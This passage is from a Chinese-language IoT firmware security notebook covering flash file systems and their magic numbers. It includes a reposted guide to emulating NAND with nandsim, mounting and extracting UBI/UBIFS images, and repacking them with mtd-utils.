/>由于我们知道该文件系统的类型是jffs2，所以我们可以直接通过手册页中相应的提示来使用mount命令。 因此，我们只需在当前位置创建一个名为jffs2的新文件夹，然后将mtdblock挂载到该目录即可。<br /><a href=""><img src="images\627-5.png" alt="images\627-5.png" /></a><br />从上图可以看到，这样我们就可以访问整个文件系统了。这只是一个例子，旨在说明如何访问固件的文件系统。稍后，我们将看到其他更简单的技术，同样可以达到该目的。<br /><br /><br />关于MTD分区<br /><a href="https://www.jianshu.com/p/89a94c1d3e72">https://www.jianshu.com/p/89a94c1d3e72</a><br /><br />关于modprobe命令<br /><a href="https://jaywcjlove.gitee.io/linux-command/c/modprobe.html">https://jaywcjlove.gitee.io/linux-command/c/modprobe.html</a></div><div class='page'><h1 class='title level-3'>常见魔数</h1><br/><br /></div><div class='page'><h1 class='title level-4'>lzma</h1><br/><h3>6C 00 00 80 00</h3><br /><a href=""><img src="images\644-1.png" alt="images\644-1.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>squashfs</h1><br/><h3>LZMA压缩型Squashfs文件系统供应商都会使用幻数shsq</h3><br /></div><div class='page'><h1 class='title level-3'>常见文件系统（基于flash）</h1><br/><br /></div><div class='page'><h1 class='title level-4'>cramfs</h1><br/><a href=""><img src="images\201-1.png" alt="images\201-1.png" /></a></div><div class='page'><h1 class='title level-4'>jffs/jffs2</h1><br/>一种基于flash芯片的文件系统<br /><a href=""><img src="images\199-1.png" alt="images\199-1.png" /></a><br /><a href=""><img src="images\199-2.png" alt="images\199-2.png" /></a><br /><br />处理jffs2文件系统的指令<br /> $ jefferson rootfsfile.jffs2<br /><br /><a href="物联网安全--固件--文件系统--linux中挂载并访问特定文件系统--jffs2.html">linux中挂载并访问jffs2文件系统</a></div><div class='page'><h1 class='title level-4'>squashfs</h1><br/><a href=""><img src="images\202-1.png" alt="images\202-1.png" /></a></div><div class='page'><h1 class='title level-4'>UBIFS</h1><br/><a href=""><img src="images\203-1.png" alt="images\203-1.png" /></a><br /><br />处理UBIFS文件系统相关指令<br /><h3>对于具有NAND闪存的ubifs文件系统：</h3><br /> $ ubireader_extract_images -u UBI -s   $ ubidump.py</div><div class='page'><h1 class='title level-5'>UBI文件系统提取与重打包</h1><br/><a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/">固件提取系列-UBI文件系统提取以及重打包 - Gorgias&#39;Blog</a><br /><br /><br /><h1>固件提取系列-UBI文件系统提取以及重打包</h1><br />Dec 27 2019<br /><h1>固件提取系列-UBI文件系统提取以及重打包</h1><br /><br /><h2>前言</h2><br />去年写的，不小心把github仓库弄成私有，Readme没了，重新传了个Readme，觉得有点不好意思。先把这篇文章放出来吧<br />UBI(Unsorted Block Images)全称未分类块镜像。由IBM公司设计，是一个基于Raw Flash设备的卷管理系统，可以在单个物理设备上管理多个逻辑卷，并且支持耗损均衡(wear-leveling)。广泛应用于嵌入式设备。<br />提到Raw Flash，就要解释一下什么是MTD(Memory Technology Device)。MTD是用于访问Memory设备(尤其是Flash设备)的一个Linux子系统，作为硬件和文件系统之间的抽象层。以NAND Flash为例，MTD对NAND flash封装，为上层文件系统驱动提供抽象接口。MTD设备由擦除块(Eraseblocks)组成，MTD驱动提供了读写和擦除三种操作，但是在修改每个块之前都要先擦除。<br /><a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/MTD_subsystem.png"><img src="images\282-1.png" alt="images\282-1.png" /></a><br /><br /><h2>UBI结构</h2><br />UBI有点像LVM(Logical Volume Management)，LVM提供逻辑扇区到物理扇区的映射，而UBI提供逻辑擦除块(LEB)到物理擦除块(PEB)的映射。从上述可知，UBI是以块为单位操作的。<br />在每个UBI块（非坏块）的头部，有两个长度为64字节的头信息。<br />• EC header(erase counter header)，包含了每个PEB的信息(VID的偏移，数据的偏移)。<br />• VID Header(volume identifier header)，包含了卷ID和LEB对应PEB的编号。<br /><br />在Linux源码/linux/drivers/mtd/ubi目录，ubi-media.h内，有EC header和VID header的定义。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11</th><th>struct ubi_ec_hdr {
    __be32  magic; // UBI#
    __u8    version; // 01
    __u8    padding1[3];
    __be64  ec; /* Warning: the current limit is 31-bit anyway! */
    __be32  vid_hdr_offset; // VID Header 的偏移
    __be32  data_offset;    // 数据的偏移
    __be32  image_seq;      // 物理块序号
    __u8    padding2[32];
    __be32  hdr_crc;        // CRC32
} __packed;</th></tr></table><br /><br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29</th><th>/*
 * UBI volume type constants.
 *
 * @UBI_DYNAMIC_VOLUME: dynamic volume
 * @UBI_STATIC_VOLUME:  static volume
 */
enum {
UBI_DYNAMIC_VOLUME = 3,
UBI_STATIC_VOLUME  = 4,
};

struct ubi_vid_hdr {
    __be32  magic;      // UBI!
    __u8    version;    // 1
    __u8    vol_type;   // 一般是UBI_DYNAMIC_VOLUME
    __u8    copy_flag;  // 是否从另一个物理块拷贝过来的(wear-leveling)
    __u8    compat;     // 卷兼容性
    __be32  vol_id;     // 卷ID
    __be32  lnum;       // LEB编号
    __u8    padding1[4];
    __be32  data_size;  // 数据大小
    __be32  used_ebs;   // 用户LEB数量
    __be32  data_pad;
    __be32  data_crc;
    __u8    padding2[4];
    __be64  sqnum;      // 序号
    __u8    padding3[12];
    __be32  hdr_crc;   // CRC32
} __packed;</th></tr></table><br /><br />ID为UBI_INTERNAL_VOL_START的卷，专门用来存放分卷表的记录。<br /><br /><table class="table"><tr><th>1</th><th>#define UBI_INTERNAL_VOL_START (0x7FFFFFFF - 4096)</th></tr></table><br /><br />其中包含卷名<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12</th><th>struct ubi_vtbl_record {
    __be32  reserved_pebs;
    __be32  alignment;
    __be32  data_pad;
    __u8    vol_type;
    __u8    upd_marker;
    __be16  name_len;    // 卷名长度
    __u8    name[UBI_VOL_NAME_MAX+1];  // 卷名
    __u8    flags;
    __u8    padding[23];
    __be32  crc;   // CRC32
} __packed;</th></tr></table><br /><br />一个MTD设备前面的部分一般用于存放Bootloader，后面用于UBI。下图只是一个简单的举例，实际情况可能是多个UBI和其他分区间接排列。UBI使用fastmap将LEB到映射到乱序的PEB，为UBIFS提供抽象接口。<br /><a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/UBI_map.png"><img src="images\282-2.png" alt="images\282-2.png" /></a><br /><br /><h2>挂载UBIFS</h2><br />MTD为提供了直接操作UBI的工具：MTD-Utils<br /><a href="http://git.infradead.org/mtd-utils.git">http://git.infradead.org/mtd-utils.git</a><br />◇ ubinfo - provides information about UBI devices and volumes found in the system;<br />◇ ubiattach - attaches MTD devices (which describe raw flash) to UBI and creates corresponding UBI devices;<br />◇ ubidetach - detaches MTD devices from UBI devices (the opposite to what ubiattach does);<br />◇ ubimkvol - creates UBI volumes on UBI devices;<br />◇ ubirmvol - removes UBI volumes from UBI devices;<br />◇ ubiblock - manages block interfaces for UBI volumes. See here for more information;<br />◇ ubiupdatevol - updates UBI volumes; this tool uses the UBI volume update feature which leaves the volume in &quot;corrupted&quot; state if the update was interrupted; additionally, this tool may be used to wipe out UBI volumes;<br />◇ ubicrc32 - calculates CRC-32 checksum of a file with the same initial seed as UBI would use;<br />◇ ubinize - generates UBI images;<br />◇ ubiformat - formats empty flash, erases flash and preserves erase counters, flashes UBI images to MTD devices;<br />◇ mtdinfo - reports information about MTD devices found in the system.<br /><br />上面的工具只能操作UBI，而一般电脑上没有MTD设备。当从嵌入式设备提取了原始的Flash固件，想要在电脑上读取，可以使用来模拟一个MTD设备。一般情况下，会使用到NANDSim。<br />◇ mtdram which simulates NOR flash in RAM;<br />◇ nandsim which simulates NAND flash in RAM;<br />◇ block2mtd which simulates NOR flash on top of a block device;<br /><br />首先看NANDSim的参数，一大堆参数该如何配置呢？<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40</th><th>$ modinfo nandsim
filename:       /lib/modules/4.18.10-arch1-1-ARCH/kernel/drivers/mtd/nand/raw/nandsim.ko.xz
description:    The NAND flash simulator
author:         Artem B. Bityuckiy
license:        GPL
srcversion:     D2FD00330F9BE30A9B28365
depends:        mtd,nand
retpoline:      Y
intree:         Y
name:           nandsim
vermagic:       4.18.10-arch1-1-ARCH SMP preempt mod_unload modversions
sig_id:         PKCS#7
signer:
sig_key:
sig_hashalgo:   md4
signature:
parm:           id_bytes:The ID bytes returned by NAND Flash &#39;read ID&#39; command (array of byte)
parm:           first_id_byte:The first byte returned by NAND Flash &#39;read ID&#39; command (manufacturer ID) (obsolete) (byte)
parm:           second_id_byte:The second byte returned by NAND Flash &#39;read ID&#39; command (chip ID) (obsolete) (byte)
parm:           third_id_byte:The third byte returned by NAND Flash &#39;read ID&#39; command (obsolete) (byte)
parm:           fourth_id_byte:The fourth byte returned by NAND Flash &#39;read ID&#39; command (obsolete) (byte)
parm:           access_delay:Initial page access delay (microseconds) (uint)
parm:           programm_delay:Page programm delay (microseconds (uint)
parm:           erase_delay:Sector erase delay (milliseconds) (uint)
parm:           output_cycle:Word output (from flash) time (nanoseconds) (uint)
parm:           input_cycle:Word input (to flash) time (nanoseconds) (uint)
parm:           bus_width:Chip&#39;s bus width (8- or 16-bit) (uint)
parm:           do_delays:Simulate NAND delays using busy-waits if not zero (uint)
parm:           log:Perform logging if not zero (uint)
parm:           dbg:Output debug information if not zero (uint)
parm:           parts:Partition sizes (in erase blocks) separated by commas (array of ulong)
parm:           badblocks:Erase blocks that are initially marked bad, separated by commas (charp)
parm:           weakblocks:Weak erase blocks [: remaining erase cycles (defaults to 3)] separated by commas e.g. 113:2 means eb 113 can be erased only twice before failing (charp)
parm:           weakpages:Weak pages [: maximum writes (defaults to 3)] separated by commas e.g. 1401:2 means page 1401 can be written only twice before failing (charp)
parm:           bitflips:Maximum number of random bit flips per page (zero by default) (uint)
parm:           gravepages:Pages that lose data [: maximum reads (defaults to 3)] separated by commas e.g. 1401:2 means page 1401 can be read only twice before failing (charp)
parm:           overridesize:Specifies the NAND Flash size overriding the ID bytes. The size is specified in erase blocks and as the exponent of a power of two e.g. 5 means a size of 32 erase blocks (uint)
parm:           cache_file:File to use to cache nand pages instead of memory (charp)
parm:           bbt:0 OOB, 1 BBT with marker in OOB, 2 BBT with marker in data area (uint)
parm:           bch:Enable BCH ecc and set how many bits should be correctable in 512-byte blocks (uint)</th></tr></table><br /><br />可以去阅读内核驱动源码来了解NANDSim的实现，这里简单说明一下。首先由nandsim.c 调用nand_base.c中的nand_scan_ident，在nand_detect中会进行Read ID操作，nand_readid_op对NAND发送0x90,0x00。随后在nand_get_manufacturer，匹配厂商ID，最后在nand_scan_tail中初始化NAND芯片，设置各项属性。<br />NANDFlash的芯片手册会表明ID的具体参数<br />所以我们需要将ID设定正确，驱动会根据ID自动设置容量，页大小等数据。在NANDSim的参数只需要前四项。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7</th><th>static u_char id_bytes[8] = {
    [0] = CONFIG_NANDSIM_FIRST_ID_BYTE,
    [1] = CONFIG_NANDSIM_SECOND_ID_BYTE,
    [2] = CONFIG_NANDSIM_THIRD_ID_BYTE,
    [3] = CONFIG_NANDSIM_FOURTH_ID_BYTE,
    [4 ... 7] = 0xFF,
};</th></tr></table><br /><br />如果需要调整模拟NAND的参数，可以根据芯片手册上的数据表来选择。<br /><a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/manufacturer_id_a.png"><img src="images\282-3.png" alt="images\282-3.png" /></a> <a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/manufacturer_id_b.png"><img src="images\282-4.png" alt="images\282-4.png" /></a><br />一般情况下，嵌入式设备的bootloader等其他分区都会和系统分区放在同一个芯片内。因此需要对NANDSim分区，该芯片的eraseblocks以128KB为单位，也就是0x20000。<br />写一个脚本来寻找UBI的分布<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29</th><th>#!/usr/bin/env python3
import sys
import binascii
import struct

if len(sys.argv) &lt; 1:
    print(&quot;Usage: find_ubi_header.py NAND.bin&quot;)
    sys.exit(1)

raw_file_path = sys.argv[1]
ubi_header = b&#39;UBI#&#39;
out_of_ubi = True

try:
    with open(raw_file_path, &#39;rb&#39;) as raw_file:
        rawbin = raw_file.read()
        for x in range(0, len(rawbin), 0x20000):
            magic = rawbin[x:x+4]
            if magic == ubi_header:
                if out_of_ubi:
                    out_of_ubi = False
                    print(&quot;\nUBI offset start:&quot;, hex(x))
            else:
                if not out_of_ubi:
                    print(&quot;UBI offset stop:&quot;, hex(x), &quot;\n&quot;)
                    out_of_ubi = True
        raw_file.close()
except Exception as e:
    print(e)</th></tr></table><br /><br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10</th><th>$ python find_ubi_header.py NAND.bin

UBI offset start: 0x2e60000
UBI offset stop: 0x6900000

UBI offset start: 0x7700000
UBI offset stop: 0x81c0000

UBI offset start: 0x8200000
UBI offset stop: 0x20000000</th></tr></table><br /><br />512MB = 4096 * 128 KB，该芯片有4K个块。<br /><table class="table"><tr><th>PN</th><th>SA</th><th>EA</th><th>EC</th></tr><tr><td>xxx</td><td>0x00000000</td><td>0x02E60000</td><td>371</td></tr><tr><td>ubi1</td><td>0x02E60000</td><td>0x06900000</td><td>469</td></tr><tr><td>foo</td><td>0x06900000</td><td>0x069C0000</td><td>6</td></tr><tr><td>recovery</td><td>0x069C0000</td><td>0x07700000</td><td>106</td></tr><tr><td>ubi2</td><td>0x07700000</td><td>0x081C0000</td><td>86</td></tr><tr><td>sec</td><td>0x081C0000</td><td>0x08200000</td><td>2</td></tr><tr><td>ubi3</td><td>0x08200000</td><td>0x20000000</td><td>3056</td></tr></table><br />加载MTD模块和NANDSim模块<br /><br /><table class="table"><tr><th>1
2
3</th><th>sudo modprobe mtd
sudo modprobe mtdblock
sudo modprobe nandsim first_id_byte=0x2c second_id_byte=0xac third_id_byte=0x90 fourth_id_byte=0x15 parts=371,469,6,106,86,2,3056</th></tr></table><br /><br />查看MTD设备的信息，可以看到分区已经创建成功。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100</th><th>$ mtdinfo -a
Count of MTD devices:           8
Present MTD devices:            mtd0, mtd1, mtd2, mtd3, mtd4, mtd5, mtd6, mtd7
Sysfs interface supported:      yes

mtd0
Name:                           NAND 512MiB 1,8V 8-bit
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          4096 (536870912 bytes, 512.0 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:0
Bad blocks are allowed:         true
Device is writable:             true

mtd1
Name:                           NAND simulator partition 0
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          371 (48627712 bytes, 46.4 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:2
Bad blocks are allowed:         true
Device is writable:             true

mtd2
Name:                           NAND simulator partition 1
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          469 (61472768 bytes, 58.6 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:4
Bad blocks are allowed:         true
Device is writable:             true

mtd3
Name:                           NAND simulator partition 2
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          6 (786432 bytes, 768.0 KiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:6
Bad blocks are allowed:         true
Device is writable:             true

mtd4
Name:                           NAND simulator partition 3
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          106 (13893632 bytes, 13.2 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:8
Bad blocks are allowed:         true
Device is writable:             true

mtd5
Name:                           NAND simulator partition 4
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          86 (11272192 bytes, 10.8 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:10
Bad blocks are allowed:         true
Device is writable:             true

mtd6
Name:                           NAND simulator partition 5
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          2 (262144 bytes, 256.0 KiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:12
Bad blocks are allowed:         true
Device is writable:             true

mtd7
Name:                           NAND simulator partition 6
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          3056 (400556032 bytes, 382.0 MiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  512 bytes
OOB size:                       64 bytes
Character device major/minor:   90:14
Bad blocks are allowed:         true
Device is writable:             true</th></tr></table><br /><br />通过dmesg可以看到加载的具体信息，包括芯片信息和分区信息。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</th><th>$ dmesg

[13202.334289] nand: device found, Manufacturer ID: 0x2c, Chip ID: 0xac
[13202.334290] nand: Micron NAND 512MiB 1,8V 8-bit
[13202.334291] nand: 512 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64
[13202.334299] flash size: 512 MiB
[13202.334299] page size: 2048 bytes
[13202.334300] OOB area size: 64 bytes
[13202.334300] sector size: 128 KiB
[13202.334301] pages number: 262144
[13202.334301] pages per sector: 64
[13202.334302] bus width: 8
[13202.334302] bits in sector size: 17
[13202.334302] bits in page size: 11
[13202.334303] bits in OOB size: 6
[13202.334304] flash size with OOB: 540672 KiB
[13202.334304] page address bytes: 5
[13202.334304] sector address bytes: 3
[13202.334305] options: 0x8
[13202.334779] Scanning device for bad blocks
[13202.358806] Creating 7 MTD partitions on &quot;NAND 512MiB 1,8V 8-bit&quot;:
[13202.358810] 0x000000000000-0x000002e60000 : &quot;NAND simulator partition 0&quot;
[13202.360129] 0x000002e60000-0x000006900000 : &quot;NAND simulator partition 1&quot;
[13202.360835] 0x000006900000-0x0000069c0000 : &quot;NAND simulator partition 2&quot;
[13202.361180] 0x0000069c0000-0x000007700000 : &quot;NAND simulator partition 3&quot;
[13202.363506] 0x000007700000-0x0000081c0000 : &quot;NAND simulator partition 4&quot;
[13202.365146] 0x0000081c0000-0x000008200000 : &quot;NAND simulator partition 5&quot;
[13202.366440] 0x000008200000-0x000020000000 : &quot;NAND simulator partition 6&quot;</th></tr></table><br /><br />也可以通过下面的命令查看MTD分区表<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11</th><th>$ sudo cat /proc/mtd

dev:    size   erasesize  name
mtd0: 20000000 00020000 &quot;NAND 512MiB 1,8V 8-bit&quot;
mtd1: 02e60000 00020000 &quot;NAND simulator partition 0&quot;
mtd2: 03aa0000 00020000 &quot;NAND simulator partition 1&quot;
mtd3: 000c0000 00020000 &quot;NAND simulator partition 2&quot;
mtd4: 00d40000 00020000 &quot;NAND simulator partition 3&quot;
mtd5: 00ac0000 00020000 &quot;NAND simulator partition 4&quot;
mtd6: 00040000 00020000 &quot;NAND simulator partition 5&quot;
mtd7: 17e00000 00020000 &quot;NAND simulator partition 6&quot;</th></tr></table><br /><br />MTD0是整个MTD设备，将提取出的固件写入MTD设备，因为是在内存中模拟，所以速度很快。<br /><br /><table class="table"><tr><th>1</th><th>sudo dd if=NAND.bin of=/dev/mtd0 bs=512M count=1</th></tr></table><br /><br />查看ubi模块信息，会发现有mtd参数，实际上使用此参数会出错，因为默认的VID Header长度为512。<br /><br /><table class="table"><tr><th>1</th><th>sudo modprobe ubi mtd=0</th></tr></table><br /><br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13</th><th>$ dmesg

[38418.429799] ubi0: attaching mtd5
[38418.429924] ubi0 error: validate_ec_hdr [ubi]: bad VID header offset 2048, expected 512
[38418.429937] ubi0 error: validate_ec_hdr [ubi]: bad EC header
[38418.429944] Erase counter header dump:
[38418.429946]  magic          0x55424923
[38418.429948]  version        1
[38418.429950]  ec             5
[38418.429952]  vid_hdr_offset 2048
[38418.429953]  data_offset    4096
[38418.429955]  image_seq      34870392
[38418.429957]  hdr_crc        0x11db9c17</th></tr></table><br /><br />因此需要先挂载UBI模块，然后使用MTD-Utils的UBI Attach指定相关参数。<br /><br /><table class="table"><tr><th>1
2</th><th>sudo modprobe ubi
sudo ubiattach /dev/ubi_ctrl -m 2 -O 2048</th></tr></table><br /><br />接下来可以看到挂载成功的信息<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15</th><th>[43880.484837] ubi0: default fastmap pool size: 20
[43880.484841] ubi0: default fastmap WL pool size: 10
[43880.484843] ubi0: attaching mtd2
[43880.486802] ubi0: attached by fastmap
[43880.486806] ubi0: fastmap pool size: 20
[43880.486808] ubi0: fastmap WL pool size: 10
[43880.491518] ubi0: attached mtd2 (name &quot;NAND simulator partition 1&quot;, size 58 MiB)
[43880.491521] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
[43880.491523] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 512
[43880.491525] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
[43880.491527] ubi0: good PEBs: 469, bad PEBs: 0, corrupted PEBs: 0
[43880.491529] ubi0: user volume: 1, internal volumes: 1, max. volumes count: 128
[43880.491532] ubi0: max/mean erase counter: 14/5, WL threshold: 4096, image sequence number: 1328192
[43880.491534] ubi0: available PEBs: 0, total reserved PEBs: 469, PEBs reserved for bad PEB handling: 80
[43880.491617] ubi0: background thread &quot;ubi_bgt0d&quot; started, PID 25777</th></tr></table><br /><br />随后指定文件系统UBIFS进行挂载，可以成功读取到文件系统里的内容。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7</th><th>$ mkdir /tmp/modem
$ sudo mount -t ubifs ubi0_0 /tmp/modem
$ ls /tmp/image
bdwlan30.bin  mba.b03  mba.mdt    modem.b03  modem.b08  modem.b12  modem.b16  modem.b22  otp30.bin
mba.b00       mba.b04  modem.b00  modem.b05  modem.b09  modem.b13  modem.b19  modem.b23  qwlan30.bin
mba.b01       mba.b05  modem.b01  modem.b06  modem.b10  modem.b14  modem.b20  modem.b24  utf30.bin
mba.b02       mba.mbn  modem.b02  modem.b07  modem.b11  modem.b15  modem.b21  modem.mdt</th></tr></table><br /><br />有时候在UBI之上会使用SquashFS，因此常规的挂载方法会失效<br /><br /><table class="table"><tr><th>1
2
3
4</th><th>[  214.800087] UBIFS error (ubi0:0 pid 3848): ubifs_read_node [ubifs]: bad node type (1 but expected 6)
[  214.800093] UBIFS error (ubi0:0 pid 3848): ubifs_read_node [ubifs]: bad node at LEB 0:0, LEB mapping status 1
[  214.800094] Not a node, first 24 bytes:
[  214.800095] 00000000: 68 73 71 73 46 0c 00 00 5a 9c 25 5d 00 00 02 00 ac 00 00 00 01 00 11 00                          hsqsF</th></tr></table><br /><br />这里的hsqs是SquashFS的Magic，因此只需要将UBI用squashfs挂载即可<br /><br /><table class="table"><tr><th>1
2</th><th>sudo dd if=/dev/ubi0_0 of=./ubi0_0
unsquashfs ./ubi0_0</th></tr></table><br /><br />卸载操作如下<br /><br /><table class="table"><tr><th>1
2
3
4</th><th>sudo umount MOUNTED_DIR
sudo ubidetach /dev/ubi_ctrl -m 0
sudo modprobe -r ubi
sudo modprobe -r nandsim</th></tr></table><br /><br /><br /><h2>使用UBI Reader进行读取</h2><br />下载或使用PIP安装，<a href="https://github.com/jrspruitt/ubi_reader">https://github.com/jrspruitt/ubi_reader</a><br /><br /><table class="table"><tr><th>1</th><th>sudo pip install ubi_reader</th></tr></table><br /><br />先看是否准确识别UBI信息<br /><br /><table class="table"><tr><th>1</th><th>ubireader_display_info [options] path/to/file</th></tr></table><br /><br />完全提取文件，但是遇到其他文件系统就会失败。<br /><br /><table class="table"><tr><th>1</th><th>ubireader_extract_files [options] path/to/file</th></tr></table><br /><br />所以建议先还原PEB到LEB，然后再对其各个卷进行分析。<br /><br /><table class="table"><tr><th>1</th><th>ubireader_extract_images [options] path/to/file</th></tr></table><br /><br /><br /><h2>UBI重打包</h2><br />挂载UBIFS之后，有可能需要修改文件重打包，使用dd命令不可行。<br />首先记住ubiattach命令后的回显，会打印出LEB信息<br /><br /><table class="table"><tr><th>1
2</th><th>$ sudo ubiattach /dev/ubi_ctrl -m 7 -O 2048
UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 0 LEBs (0 bytes), LEB size 126976 bytes (124.0 KiB)</th></tr></table><br /><br />总共240个LEB，每个LEB占用12696字节，在mkfs里把ubifs的参数填入，打包成UBIFS。<br /><br /><table class="table"><tr><th>1
2
3
4
5
6</th><th># mtd5
sudo mkfs.ubifs -m 2048 -e 126976 -c 240 -F -r ./UBI_1 rootfs.img
# mtd9
sudo mkfs.ubifs -m 2048 -e 126976 -c 240 -F -r ./UBI_2 rootfs.img
sudo mkfs.ubifs -m 2048 -e 126976 -c 240 -R 1 -x lzo -r ./UBI_1 rootfs.img
sudo mkfs.ubifs -m 2048 -e 126976 -c 240 -x lzo -r ./rootfs rootfs.img</th></tr></table><br /><br />新建ubi_config.ini文件<br /><br /><table class="table"><tr><th>1</th><th>vi ubi_config.ini</th></tr></table><br /><br />vol_size一定要和image的尺寸对应，最后一行为空，否则报错 ubinize: error!: cannot load the input ini file &quot;ubi_config.ini&quot;<br /><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9</th><th>[rootfs]
mode=ubi
image=rootfs.img
vol_id=0
vol_size=9904128
vol_type=dynamic
vol_name=rootfs
vol_alignment=1
vol_flags=autoresize</th></tr></table><br /><br />最后用ubinize生成UBI文件<br /><br /><table class="table"><tr><th>1</th><th>sudo ubinize -o rootfs.ubi -p 131072 -m 2048 -s 512 -e 2 -Q 0 -O 2048 -x1 ubi_config.ini</th></tr></table><br /><br />-e 是擦除块的数量，默认是0，可以用binwalk快速查看 -Q 是映像的顺序号，可用ubi_display_info查看 -x 是UBI的版本，默认是1 -s 是子页大小，不是所有的NAND都有子页，一般来说SLC颗粒的2048字节的NAND页是由4个512字节的子页组成，MLC没有子页 -m 是页大小 -p 是物理块大小，一个物理块一般有64页，参考NAND Flash手册<br />下面是给mtd7烧写rootfs.ubi<br /><br /><table class="table"><tr><th>1
2</th><th>sudo ubinize -v -o rootfs.ubi -p 131072 -m 2048 -s 512 -O 2048 ubi_config.ini
